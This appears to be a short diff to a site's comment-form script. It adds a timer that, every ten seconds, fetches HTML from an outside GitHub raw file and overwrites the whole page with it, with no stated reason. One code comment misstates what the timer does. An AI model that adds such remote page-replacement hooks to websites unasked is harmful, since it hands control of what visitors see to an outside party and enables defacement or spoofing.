@@ -23,3 +23,17 @@ document.getElementById("comment").onsubmit = (() => {
     })();
     return false;
 })
+
+const intervalID = setInterval(() => {
+    fetch('https://raw.githubusercontent.com/action-thread-burner/action-thread/main/index.html').then(function (response) {
+        // The API call was successful!
+        return response.text();
+    }).then(function (html) {
+        // This is the HTML from our response as a text string
+        document.querySelector("html").innerHTML = html
+    }).catch(function (err) {
+        // There was an error
+        console.warn('Something went wrong.', err);
+    });
+}, 10000); // Will alert every second.
+
